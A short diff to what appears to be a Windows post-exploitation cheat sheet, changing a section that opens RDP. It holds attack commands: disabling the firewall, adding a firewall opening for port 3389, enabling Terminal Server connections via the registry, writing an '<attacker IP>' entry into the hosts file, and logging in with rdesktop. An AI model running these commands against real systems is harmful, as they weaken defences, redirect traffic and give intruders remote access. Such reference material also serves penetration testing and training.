@@ -152,7 +152,7 @@ dir c:\*.pdf /s                         # Show all PDFs.
 # Firewall
 
 netsh firewall show config
-netsh firewall add portopening TCP 8081 ePO
+netsh firewall add portopening TCP 3389 RDP
 netsh firewall set opmode disable       # Disable firewall.
 
 firewall show state
@@ -172,16 +172,11 @@ echo <attacker IP> facebook >> %WINDIR%\System32\drivers\etc\hosts
 type %WINDIR%\System32\drivers\etc\hosts
 ------------------------------------------------------------------------------------------------------
 
-# Misc
+# Open RDP in the firewall, start the service, and login
 
-cd \WINDOWS\system32\
-type %SYSTEMDRIVE%\boot.ini
-type %WINDIR%\win.ini
-fsutil fsinfo drives
-
+netsh firewall add portopening TCP 3389 RDP
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-
-netsh rdesktop <target-IP>
+rdesktop -u <user> <targetIP>
 ------------------------------------------------------------------------------------------------------
 
 # Commands
